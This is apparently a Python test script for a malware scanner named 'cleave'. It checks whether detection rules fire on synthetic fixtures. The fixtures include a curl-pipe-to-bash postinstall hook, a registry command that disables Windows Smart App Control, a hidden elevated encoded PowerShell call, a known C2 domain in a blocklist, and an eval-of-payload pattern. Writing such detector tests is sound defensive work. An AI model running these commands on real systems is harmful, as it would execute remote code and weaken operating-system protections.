"""Exercise reference exclusions and Smart App Control call context."""
import json
import os
import pathlib
import re
import subprocess
import sys
import zipfile
import hashlib

out = pathlib.Path(sys.argv[1])
out.mkdir(parents=True, exist_ok=True)
cleave = os.environ.get('CLEAVE', 'cleave')
root = 'supply-chain-guard-9.0.0/'
repository = 'https://github.com/homeofe/supply-chain-guard.git'
hook = {'name': 'fixture', 'scripts': {'postinstall': 'curl https://example.org/payload | bash'}}
target = 'objectives/supply-chain/install-hook/scripts/postinstall::curl-pipe-shell'
results = []

# Keep the B278 disposition connected to the exact former consumers. A path
# label is not proof of provenance and must not return as a behavior
# suppressor without an explicit review of each affected rule.
repo_root = pathlib.Path(__file__).resolve().parents[2]
disposition_path = repo_root / 'taxonomy-migration/batches/278-source-exclusion-selector-precision/source-exclusion-disposition.json'
disposition = json.loads(disposition_path.read_text())
disposition_files = {row['file']: row['current_sha256'] for row in disposition['file_hashes']}
for consumer_file in sorted({row['file'] for row in disposition['consumers']}):
    source_file = repo_root / consumer_file
    source = source_file.read_bytes()
    assert hashlib.sha256(source).hexdigest() == disposition_files[consumer_file], (
        'B278 disposition needs review after source changed', consumer_file)
    assert disposition['original_selector'].encode() not in source, (
        'path-only source selector returned to an affected consumer', consumer_file)
results.append({'case': 'b278-original-consumers-remain-free-of-path-suppressor',
                'matched': len(disposition_files)})

for label, member, repo, expected in [
    ('runtime-control', 'src/runtime/package.json', repository, True),
    ('path-control', 'src/__tests__/fixtures/pkg/package.json', repository, True),
]:
    archive = out / (label + '.zip')
    prefix = 'ordinary-package-9.0.0/' if label == 'path-control' else root
    with zipfile.ZipFile(archive, 'w') as z:
        z.writestr(prefix + 'package.json', json.dumps({'name': 'supply-chain-guard', 'repository': {'type': 'git', 'url': repo}}))
        z.writestr(prefix + member, json.dumps(hook))
    proc = subprocess.run([cleave, '--no-update-check', '--traits-dir', '.', '--json', str(archive)], capture_output=True, text=True)
    if proc.returncode:
        raise RuntimeError(proc.stderr)
    report = json.loads(proc.stdout)
    matched = any(t['id'] == target for f in report['files'] for t in f.get('traits', []))
    assert matched == expected, (label, matched, expected)
    results.append({'case': label, 'matched': matched})
# Command text stays notable; the suspicious composite also needs execution.
command = "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy' /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f"
elevation = "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-NoProfile -EncodedCommand AAAA'"
for label, invoke in [('commands-only', False), ('elevation-call', True)]:
    script = out / (label + '.js')
    text = "const policy = " + json.dumps(command) + ";\nconst elevation = " + json.dumps(elevation) + ";\n"
    if invoke:
        text += "const {spawnSync} = require('child_process'); spawnSync('powershell', ['-Command', elevation]);\n"
    script.write_text(text)
    proc = subprocess.run([cleave, '--no-update-check', '--traits-dir', '.', '--json', str(script)], capture_output=True, text=True)
    if proc.returncode:
        raise RuntimeError(proc.stderr)
    report = json.loads(proc.stdout)
    ids = {t['id'] for f in report['files'] for t in f.get('traits', [])}
    assert 'micro-behaviors/os/security/policy::reg-smart-app-control-disable-command' in ids
    suspicious = 'objectives/impact/degrade/windows-policy::javascript-smart-app-control-disable' in ids
    assert suspicious == invoke, (label, suspicious, invoke)
    results.append({'case': label, 'suspicious': suspicious})
for label, android in [('jar-asset-control', False), ('apk-asset-layout', True)]:
    archive = out / (label + '.zip')
    with zipfile.ZipFile(archive, 'w') as z:
        z.writestr('assets/dataasset.payload', b'opaque data')
        if android:
            z.writestr('AndroidManifest.xml', b'<manifest package="example.test"/>')
            z.writestr('classes.dex', b'')
            z.writestr('resources.arsc', b'')
        else:
            z.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n')
    proc = subprocess.run([cleave, '--no-update-check', '--traits-dir', '.', '--json', str(archive)], capture_output=True, text=True)
    if proc.returncode:
        raise RuntimeError(proc.stderr)
    report = json.loads(proc.stdout)
    ids = {t['id'] for f in report['files'] for t in f.get('traits', [])}
    assert 'metadata/package/files/name::archive-assets-data-member' in ids
    apk = 'metadata/package/files/mobile-package::apk-assets-data-member' in ids
    assert apk == android, (label, apk, android)
    results.append({'case': label, 'apk': apk})

# The broad context aggregate also includes IOC blocklists. It must not be
# copied into behavior-rule `unless` clauses: a real indicator remains visible
# when IOC declarations occur in otherwise unreviewed runtime source.
ioc_source = out / root / 'src/runtime/ioc-overlap.ts'
ioc_source.parent.mkdir(parents=True, exist_ok=True)
ioc_source.write_text('''export const KNOWN_C2_DOMAINS: string[] = [\n  "m-kosche.com",\n];\nexport const KNOWN_BAD_NPM_VERSIONS: Record<string, string[]> = {};\n''')
ioc_report = subprocess.run(
    [cleave, '--no-update-check', '--traits-dir', '.', '--json', str(ioc_source)],
    capture_output=True, text=True, check=True)
ioc_ids = {t['id'] for f in json.loads(ioc_report.stdout)['files']
           for t in f.get('traits', [])}
c2_id = 'well-known/malware/supply-chain/shai-hulud::m-kosche-c2-host'
assert c2_id in ioc_ids, ('IOC context hid a C2 indicator', sorted(ioc_ids))
ioc_rules = [
    'well-known/tool/detection/supply-chain-guard/ioc::exported-ioc-blocklists',
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-source-code-path-context',
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-source-reference-path-context',
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-detection-reference-path-context',
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-source-path-context',
    c2_id,
]
ioc_trace = subprocess.run(
    [cleave, '--no-update-check', '--traits-dir', '.', 'test-rules',
     str(ioc_source), '--rules', ','.join(ioc_rules)],
    capture_output=True, text=True, check=True)
for rid in (ioc_rules[0], ioc_rules[3], c2_id):
    assert re.search(r'^MATCHED '+re.escape(rid)+r' \(', ioc_trace.stdout, re.M), rid
for rid in (ioc_rules[1], ioc_rules[2], ioc_rules[4]):
    assert re.search(r'^NOT MATCHED '+re.escape(rid)+r' \(', ioc_trace.stdout, re.M), rid
results.append({'case': 'ioc-overlap-does-not-hide-c2', 'matched': c2_id in ioc_ids})

# Exported IOC blocklists can live beside matcher code, but remain indicator
# data. They must not inherit the reviewed-source behavior suppression.
ioc_blocklist = out / root / 'src/ioc-blocklist.ts'
ioc_blocklist.parent.mkdir(parents=True, exist_ok=True)
ioc_blocklist.write_text('''export const KNOWN_C2_DOMAINS: string[] = [\n  "m-kosche.com",\n];\nexport const KNOWN_BAD_NPM_VERSIONS: Record<string, string[]> = {};\n''')
ioc_blocklist_report = subprocess.run(
    [cleave, '--no-update-check', '--traits-dir', '.', '--json', str(ioc_blocklist)],
    capture_output=True, text=True, check=True)
ioc_blocklist_ids = {t['id'] for f in json.loads(ioc_blocklist_report.stdout)['files']
                     for t in f.get('traits', [])}
assert c2_id in ioc_blocklist_ids, ('IOC blocklist context hid a C2 indicator', sorted(ioc_blocklist_ids))
ioc_blocklist_trace = subprocess.run(
    [cleave, '--no-update-check', '--traits-dir', '.', 'test-rules',
     str(ioc_blocklist), '--rules', ','.join(ioc_rules + [
         'objectives/anti-static/obfuscation/payload/encoded/exec::defensive-python-input-context',
         'objectives/anti-static/obfuscation/payload/encoded/exec::defensive-shell-input-context',
     ])],
    capture_output=True, text=True, check=True)
python_context = 'objectives/anti-static/obfuscation/payload/encoded/exec::defensive-python-input-context'
shell_context = 'objectives/anti-static/obfuscation/payload/encoded/exec::defensive-shell-input-context'
for rid in (ioc_rules[0], c2_id):
    assert re.search(r'^MATCHED '+re.escape(rid)+r' \(', ioc_blocklist_trace.stdout, re.M), rid
for rid in (ioc_rules[1], ioc_rules[2], ioc_rules[4], python_context, shell_context):
    assert re.search(r'^NOT MATCHED '+re.escape(rid)+r' \(', ioc_blocklist_trace.stdout, re.M), rid
results.append({'case': 'ioc-blocklist-does-not-inherit-benign-source-context',
                'matched': c2_id in ioc_blocklist_ids})

# These selectors classify source-looking paths; they do not prove provenance
# and must not suppress behavior findings.
matcher_file = out / root / 'src/matchers/patterns.ts'
matcher_file.parent.mkdir(parents=True, exist_ok=True)
matcher_file.write_text('Promise.resolve(payload).then(eval);\n')
group_rules = [ioc_rules[1], ioc_rules[2], ioc_rules[4]]
matcher_trace = subprocess.run(
    [cleave, '--no-update-check', '--traits-dir', '.', 'test-rules',
     str(matcher_file), '--rules', ','.join(group_rules + [
         'objectives/command-and-control/dropper/script-eval/remote-code::then-eval-pointfree',
     ])],
    capture_output=True, text=True, check=True)
for rid in (ioc_rules[1], ioc_rules[4]):
    assert re.search(r'^MATCHED '+re.escape(rid)+r' \(', matcher_trace.stdout, re.M), rid
assert re.search(r'^NOT MATCHED '+re.escape(ioc_rules[2])+r' \(', matcher_trace.stdout, re.M)
behavior_id = 'objectives/command-and-control/dropper/script-eval/remote-code::then-eval-pointfree'
assert re.search(r'^MATCHED '+re.escape(behavior_id)+r' \(', matcher_trace.stdout, re.M), behavior_id
results.append({'case': 'source-path-context-is-only-a-classification', 'matched': ioc_rules[4]})
results.append({'case': 'source-shaped-executable-behavior-remains-visible', 'matched': behavior_id})

# README paths are also only reference-path context, not proof of trusted
# authorship.
reference_file = out / root / 'README.md'
reference_file.parent.mkdir(parents=True, exist_ok=True)
reference_file.write_text('# Reviewed source distribution\n')
reference_rules = [
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-source-code-path-context',
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-source-reference-path-context',
    'well-known/tool/detection/supply-chain-guard/source::supply-chain-guard-source-path-context',
]
reference_trace = subprocess.run(
    [cleave, '--no-update-check', '--traits-dir', '.', 'test-rules',
     str(reference_file), '--rules', ','.join(reference_rules)],
    capture_output=True, text=True, check=True)
assert re.search(r'^NOT MATCHED '+re.escape(reference_rules[0])+r' \(', reference_trace.stdout, re.M)
assert re.search(r'^MATCHED '+re.escape(reference_rules[1])+r' \(', reference_trace.stdout, re.M)
assert re.search(r'^MATCHED '+re.escape(reference_rules[2])+r' \(', reference_trace.stdout, re.M)
results.append({'case': 'reference-path-context-is-only-a-classification', 'matched': reference_rules[2]})
print(json.dumps(results, indent=2))
